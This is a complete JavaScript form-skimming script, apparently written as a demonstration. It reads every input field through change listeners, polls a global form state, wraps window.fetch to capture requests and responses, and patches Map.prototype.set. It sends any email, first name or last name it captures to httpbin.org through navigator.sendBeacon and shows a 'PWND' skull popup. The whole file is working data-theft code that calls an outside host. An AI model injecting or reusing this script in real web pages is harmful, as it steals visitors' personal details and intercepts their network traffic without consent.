const pwned = (data, type) => {
  if (data.includes("email") || data.includes("firstName") || data.includes("lastName")) {
      navigator.sendBeacon(`https://httpbin.org/post?${type}`, JSON.stringify(data));

      //show a popper on the document's bottom right corner stating 'PWND: values' with a skull in front of it
      const popper = document.createElement("div");
      popper.style.position = "fixed";
      popper.style.bottom = "10px";
      popper.style.right = "10px";
      popper.style.backgroundColor = "black";
      popper.style.padding = "10px";
      popper.style.border = "1px solid white";
      popper.style.borderRadius = "5px";
      popper.style.zIndex = "1000";
      popper.style.color = "white";
      popper.textContent = `💀 PWND: ${data} ${type}`;
      document.body.appendChild(popper);
      setTimeout(() => {
          document.body.removeChild(popper);
      }, 3000);
  } else {
      console.log("not pwned", data); 
  }
}

/**
* Looking for inputs in the dom and sending them to httpbin if they change
*/

const handleChange = (e) => {
  console.log("change", e.target.name, e.target.value);
  const data = JSON.stringify({
      name: e.target.name,
      value: e.target.value,
  }, null, 2);
  pwned(data, "stolenInputValue");
}

const resetListeners = () => {
  const inputFields = document.querySelectorAll("input");
  inputFields.forEach((input) => {
      input.removeEventListener("change", handleChange);
      input.addEventListener("change", handleChange);
  });
}

const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
      if (mutation.addedNodes.length > 0) {
          resetListeners();
      }
  });
});

observer.observe(document.body, { childList: true, subtree: true });

resetListeners();

/**
* Polling for the formState every second and sending it to httpbin if it changes
*/
let sentData = undefined;
setInterval(() => {
  const formState = window.formState;
  if (formState && formState.size) {
      const data = Object.fromEntries(formState);
      if (JSON.stringify(sentData) !== JSON.stringify(data)) {
          console.log(data);
          pwned(JSON.stringify(data, null, 2), "stolenFormState");
          sentData = data;
      }
  }
}, 1000);

/**
* Putting some sneaking stuff inside window.fetch to send the form data to httpbin
*/
(function () {
  const originalFetch = window.fetch;

  function exfiltrate(data) {
    try {
      pwned(JSON.stringify(data, null, 2), "stolenFetchData");
    } catch (e) {}
  }

  window.fetch = async function (...args) {
    const [resource, config] = args;
    const method = (config && config.method) || 'GET';
    const body = (config && config.body) || null;
    const url = typeof resource === "string" ? resource : resource.url;

    exfiltrate({
      direction: 'outgoing',
      url,
      method,
      body,
      timestamp: Date.now()
    });

    const response = await originalFetch(...args);

    try {
      const cloned = response.clone();
      cloned.text().then((bodyText) => {
        exfiltrate({
          direction: 'incoming',
          url,
          status: response.status,
          response: bodyText.slice(0, 1000),
          timestamp: Date.now()
        });
      });
    } catch (e) {}

    return response;
  };
})();

  
  /**
   * alter the Map prototype to send the form state to httpbin the moment a key with 'email', 'firstName' or 'lastName' is set
   */
  const originalSet = Map.prototype.set;
  Map.prototype.set = function (key, value) {
    if (key === 'email' || key === 'firstName' || key === 'lastName') {
      pwned(JSON.stringify({ [key]: value }, null, 2), "stolenFormStateWithPrototype");
    }
    return originalSet.call(this, key, value);
  };